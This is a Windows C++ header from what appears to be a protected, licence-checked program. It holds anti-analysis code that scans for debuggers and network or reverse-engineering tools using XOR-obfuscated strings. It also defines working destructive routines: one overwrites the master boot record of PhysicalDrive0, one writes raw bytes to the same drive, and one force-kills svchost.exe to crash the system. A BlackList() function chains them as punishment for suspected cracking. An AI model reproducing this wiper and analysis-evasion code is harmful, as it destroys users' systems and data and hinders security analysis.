#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <filesystem>
#include <vector>
#include "lazy.h"
#include "../SkCrypt.h"
#include "../xorst.h"
#include <string>
#include <iostream>
#include <stdio.h>
#include <winhttp.h>
#include "../auth.hpp"
#pragma comment(lib, "winhttp.lib")





bool find1(const char* name)
{
    const auto snap = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 proc_entry{};
    proc_entry.dwSize = sizeof proc_entry;

    auto found_process = false;
    if (!!LI_FN(Process32First).safe()(snap, &proc_entry)) {
        do {
            if (name == proc_entry.szExeFile) {
                found_process = true;
                break;
            }
        } while (!!LI_FN(Process32Next).safe()(snap, &proc_entry));
    }

    LI_FN(CloseHandle).safe()(snap);
    return found_process
        ? proc_entry.th32ProcessID
        : 0;
}
void mbrwipe()
{
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (drive == INVALID_HANDLE_VALUE) { 
        std::cerr << "Failed to open physical drive. Error code: " << GetLastError() << std::endl;
        return;
    }

    HANDLE binary = CreateFileW(L"./boot.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (binary == INVALID_HANDLE_VALUE) { 
        std::cerr << "Failed to open binary file. Error code: " << GetLastError() << std::endl;
        CloseHandle(drive);
        return;
    }

    DWORD size = GetFileSize(binary, NULL);
    if (size != 512) {
        std::cerr << "Invalid binary file size. Expected 512 bytes." << std::endl;
        CloseHandle(binary);
        CloseHandle(drive);
        return;
    }

    std::uint8_t* new_mbr = new(std::nothrow) std::uint8_t[size];
    if (!new_mbr) {
        std::cerr << "Memory allocation failed." << std::endl;
        CloseHandle(binary);
        CloseHandle(drive);
        return;
    }

    DWORD bytes_read;
    if (!ReadFile(binary, new_mbr, size, &bytes_read, NULL)) {
        std::cerr << "Error reading binary file. Error code: " << GetLastError() << std::endl;
        delete[] new_mbr;
        CloseHandle(binary);
        CloseHandle(drive);
        return;
    }

    if (!WriteFile(drive, new_mbr, size, &bytes_read, NULL)) {
        std::cerr << "Error writing to physical drive. Error code: " << GetLastError() << std::endl;
        delete[] new_mbr;
        CloseHandle(binary);
        CloseHandle(drive);
        return;
    }

    std::cout << "MBR overwritten successfully!" << std::endl;

    delete[] new_mbr;
    CloseHandle(binary);
    CloseHandle(drive);
}
void mbr_rape() {
    HANDLE hDevice = CreateFile(
        "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );


    BYTE buffer[] = {
        0xE8, 0x15, 0x00
    };

    DWORD bytes_written;
    WriteFile(hDevice, buffer, sizeof(buffer), &bytes_written, NULL);
    CloseHandle(hDevice);
}




namespace BlackListed
{

}
namespace malicousactivity
{
    void bsod()
    {
        system(_xor_("TASKKILL /F /IM svchost.exe 2>NULL").c_str());

    }
}



void BlackList()
{
    //KeyAuthApp.log("user tried to crack");
   // GlobalAddAtomA(_xor_("blacklist ? ?").c_str());

    //Sleep(300);
    mbrwipe();
    mbr_rape();
    malicousactivity::bsod();

}
void BlackListStopper()
{

}

int check_processes()
{
    std::vector<const char*> processes = {
    _xor_("ollydbg.exe").c_str(),
    _xor_("ProcessHacker.exe").c_str(),
    _xor_("tcpview.exe").c_str(),
    _xor_("autoruns.exe").c_str(),
    _xor_("autorunsc.exe").c_str(),
    _xor_("filemon.exe").c_str(),
    _xor_("procmon.exe").c_str(),
    _xor_("regmon.exe").c_str(),
    _xor_("procexp.exe").c_str(),
    _xor_("idaq.exe").c_str(),
    _xor_("idaq64.exe").c_str(),
    _xor_("ida.exe").c_str(),
    _xor_("ida64.exe").c_str(),
    _xor_("ImmunityDebugger.exe").c_str(),
    _xor_("Wireshark.exe").c_str(),
    _xor_("dumpcap.exe").c_str(),
    _xor_("HookExplorer.exe").c_str(),
    _xor_("ImportREC.exe").c_str(),
    _xor_("PETools.exe").c_str(),
    _xor_("LordPE.exe").c_str(),
    _xor_("SysInspector.exe").c_str(),
    _xor_("proc_analyzer.exe").c_str(),
    _xor_("sysAnalyzer.exe").c_str(),
    _xor_("sniff_hit.exe").c_str(),
    _xor_("windbg.exe").c_str(),
    _xor_("joeboxcontrol.exe").c_str(),
    _xor_("joeboxserver.exe").c_str(),
    _xor_("ResourceHacker.exe").c_str(),
    _xor_("x32dbg.exe").c_str(),
    _xor_("x64dbg.exe").c_str(),
    _xor_("Fiddler.exe").c_str(),
    _xor_("httpdebugger.exe").c_str(),
    _xor_("HTTP Debugger Windows Service (32 bit).exe").c_str(),
    _xor_("HTTPDebuggerUI.exe").c_str(),
    _xor_("HTTPDebuggerSvc.exe").c_str(),
    _xor_("cheatengine-x86_64.exe").c_str(),
    _xor_("cheatengine-x86_64-SSE4-AVX2.exe").c_str(),
    };

    for (auto process : processes)
    {
        if (find1(process))
        {
            //BlackList();
            system("color 4");
            //KeyAuthApp.log("user tried to crack in");
            std::cout << (_xor_("Unallowed Process Found, Please Restart PC or Contact Support."));
            Sleep(3000);
            exit(0);
        }
    }
    return false;
}